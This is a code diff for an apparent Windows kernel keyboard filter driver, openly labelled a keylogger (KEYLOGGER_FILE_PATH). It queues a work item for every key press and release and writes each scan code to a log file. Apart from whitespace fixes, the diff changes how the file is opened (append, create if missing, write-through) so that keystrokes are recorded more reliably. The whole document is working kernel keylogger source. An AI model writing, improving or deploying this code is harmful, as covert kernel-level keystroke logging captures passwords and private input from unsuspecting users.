@@ -826,15 +826,15 @@ Return Value:
 		//debug print
 		if (currentPointer->Flags == KEY_MAKE)
 		{
-			DebugPrint(("mb irql: %d sc 1: 0x%0x KEY_MAKE\n",KeGetCurrentIrql(), currentPointer->MakeCode));
+			DebugPrint(("mb irql: %d sc 1: 0x%0x KEY_MAKE\n", KeGetCurrentIrql(), currentPointer->MakeCode));
 		}
 		else if (currentPointer->Flags == KEY_BREAK)
 		{
-			DebugPrint(("mb irql: %d sc 1: 0x%0x KEY_BREAK\n",KeGetCurrentIrql(), currentPointer->MakeCode));
+			DebugPrint(("mb irql: %d sc 1: 0x%0x KEY_BREAK\n", KeGetCurrentIrql(), currentPointer->MakeCode));
 		}
 
-		
-	
+
+
 		//
 		//  Queue an OSR work item for execution
 		//
@@ -850,7 +850,7 @@ Return Value:
 		//
 		OsrWorkItem->MakeCode = (PVOID)currentPointer->MakeCode;
 		OsrWorkItem->Flags = (PVOID)currentPointer->Flags;
-		
+
 
 		//
 		// Init the work item embedded in the private structure
@@ -869,7 +869,7 @@ Return Value:
 	}
 
 
-	
+
 	//MB end
 
 	(*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)devExt->UpperConnectData.ClassService)(
@@ -953,7 +953,7 @@ WorkRoutine(PVOID Parameter)
 		UNICODE_STRING     uniName;
 		OBJECT_ATTRIBUTES  objAttr;
 
-		RtlInitUnicodeString(&uniName,KEYLOGGER_FILE_PATH);
+		RtlInitUnicodeString(&uniName, KEYLOGGER_FILE_PATH);
 		InitializeObjectAttributes(&objAttr, &uniName,
 			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
 			NULL, NULL);
@@ -963,29 +963,22 @@ WorkRoutine(PVOID Parameter)
 		HANDLE   handle;
 		NTSTATUS ntstatus;
 		IO_STATUS_BLOCK    ioStatusBlock;
-					
+
 		ntstatus = ZwCreateFile(&handle,
-			GENERIC_READ | GENERIC_WRITE,
+			FILE_APPEND_DATA | SYNCHRONIZE,
 			&objAttr, &ioStatusBlock, NULL,
 			FILE_ATTRIBUTE_NORMAL,
-			0,
-			FILE_OPEN,
-			FILE_NON_DIRECTORY_FILE | FILE_RANDOM_ACCESS |
-			FILE_NO_INTERMEDIATE_BUFFERING | FILE_SYNCHRONOUS_IO_NONALERT,
+			FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
+			FILE_OPEN_IF,
+			FILE_WRITE_THROUGH | FILE_SYNCHRONOUS_IO_NONALERT | FILE_SEQUENTIAL_ONLY | FILE_NON_DIRECTORY_FILE,
 			NULL, 0);
 
 		//opening and writing to file
-		CHAR     buffer[LOG_BUFFER_SIZE]; 
+		CHAR     buffer[LOG_BUFFER_SIZE];
 		size_t  cb;
 
-		//Set the byte offset to the end of file
-		LARGE_INTEGER ByteOffset;
-
-		ByteOffset.HighPart = -1;
-		ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;
-
 		if (NT_SUCCESS(ntstatus)) {
-			//wiriting logs to file
+
 			if (OsrWorkItem->Flags == KEY_MAKE) {
 				ntstatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "scan code: 0x%0x KEY_MAKE\r\n", OsrWorkItem->MakeCode);
 			}
@@ -993,12 +986,13 @@ WorkRoutine(PVOID Parameter)
 			{
 				ntstatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "scan code: 0x%0x KEY_BREAK\r\n", OsrWorkItem->MakeCode);
 			}
-			
+
+			//wiriting logs to file
 			if (NT_SUCCESS(ntstatus)) {
 				ntstatus = RtlStringCbLengthA(buffer, sizeof(buffer), &cb);
 				if (NT_SUCCESS(ntstatus)) {
 					ntstatus = ZwWriteFile(handle, NULL, NULL, NULL, &ioStatusBlock,
-						buffer, cb, &ByteOffset, NULL);
+						buffer, cb, NULL, NULL);
 				}
 			}
 			ZwClose(handle);
